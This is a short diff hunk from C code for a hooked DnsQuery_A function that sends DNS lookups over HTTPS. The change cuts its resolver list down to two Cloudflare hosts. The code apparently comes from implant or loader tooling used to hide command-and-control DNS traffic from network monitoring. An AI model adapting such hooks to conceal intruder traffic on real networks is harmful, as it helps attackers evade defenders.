@@ -84,7 +84,7 @@ D_SEC( D ) DNS_STATUS WINAPI DnsQuery_A_Hook( _In_ PCSTR pszName, _In_ WORD wTyp
 	HINTERNET	Iop = NULL;
 	HINTERNET	Icp = NULL;
 	HINTERNET	Hop = NULL;
-	ULONG_PTR 	Lst[] = { G_SYM( "dns.google.com" ), G_SYM( "doh.opendns.com" ), G_SYM( "mozilla.cloudflare-dns.com" ), G_SYM( "cloudflare-dns.com" ) };
+	ULONG_PTR 	Lst[] = { G_SYM( "mozilla.cloudflare-dns.com" ), G_SYM( "cloudflare-dns.com" ) };
 
 	RtlSecureZeroMemory( &Api, sizeof( Api ) );
 	RtlSecureZeroMemory( &Uni, sizeof( Uni ) );
